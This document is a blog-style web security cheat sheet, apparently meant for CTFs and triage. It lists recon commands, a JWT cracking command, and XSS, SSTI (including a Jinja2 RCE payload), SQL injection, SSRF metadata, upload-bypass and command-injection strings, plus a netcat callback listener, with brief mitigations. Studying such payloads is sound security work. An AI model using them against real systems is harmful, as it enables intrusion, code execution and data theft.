---
title: "Web Security Notes — Practical Playbook"
date: "2025-10-29"
author: "th3mujd11"
category: "web"
tags: [web, cheatsheet, xss, ssti, sqli, ssrf, idor]
---

# Overview

Opinionated, field-tested notes for common web vulns and the fastest probes that catch them. Optimized for CTFs and quick triage.

---

# Methodology Snapshot

- Recon: `whatweb`, crawl, JS grep for hidden routes and API keys.
- Inputs: enumerate every parameter, both query and body (JSON + form).
- Trust boundaries: auth/session, ID space, file boundaries, outbound network.
- Feedback: watch server errors/timeouts, and reflect vs. store behavior.

```bash
whatweb -a 3 https://target
feroxbuster -u https://target -t 50 -x html,txt,js -o ferox.txt
rg -n "api|key|token|secret|/admin|/internal" -S public/*.js
```

---

# Authentication & Session

- Default creds, weak sign-up validation, invited-only toggles.
- Session fixation: check if session changes on login.
- JWT checks: `none` alg, key confusion, weak secrets.

```bash
# try common JWT secrets with jwtcrack or wordlists
python3 -m jwtcrack -t <token> -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

---

# Access Control (IDOR)

Probe sequential/non-random IDs and foreign keys.

```http
GET /api/user/1001  -> 200
GET /api/user/1002  -> 200 (if not yours, IDOR)
```

Mitigate with server-side ownership checks and deny-by-default routes.

---

# XSS (Reflected/Stored)

Fastest checks that bypass naive filters:

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)></svg>
<a href=javasript:alert(1)>x</a>
```

Look for JSON contexts and DOM sinks (`innerHTML`, `location.hash`).

---

# SSTI

Arithmetic canaries and engine pivots:

```text
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>
```

Jinja2 to RCE:

```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

---

# SQL Injection

Boolean/time probes and UNION path.

```text
' OR 1=1 -- -
' OR SLEEP(2) -- -

# UNION template
' UNION SELECT 1,@@version,3 -- -
```

Mitigate with parameterized queries and strict ORM usage.

---

# SSRF

Targets: `127.0.0.1`, `169.254.169.254`, Docker/Cloud metadata, internal admin.

```http
url=http://127.0.0.1:80/health
url=http://169.254.169.254/latest/meta-data/
```

Defense: allowlists, URL parsing in server-side libs, block private ranges.

---

# File Upload

Tricks: double extensions, case toggles, polyglot content, race updates.

```text
shell.php%00.jpg
SHeLl.PHp
```

Server-side: validate magic bytes, store outside webroot, randomize names.

---

# Deserialization

Look for encoded blobs, `pickle`, `php serialize`, or Java `readObject`.

Mitigate with signed tokens and safe serializers.

---

# Command Injection

Whitespace/IFS variants:

```text
;id
|id
||id
$(id)
`id`
${IFS}id
```

---

# Crypto Gotchas

- ECB mode, constant nonces, hardcoded keys, truncated MACs.
- JWT: `alg=none`, HS/RS confusion.

---

# Handy One-Liners

```bash
# quick HTTP server
python3 -m http.server 8000

# listen for callbacks
nc -lvnp 4444

# URL encode/decode
python3 - << 'PY'
import urllib.parse as u; s=input(); print(u.quote(s)); print(u.unquote(s))
PY
```

---

# References

- PortSwigger Web Academy: https://portswigger.net/web-security
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

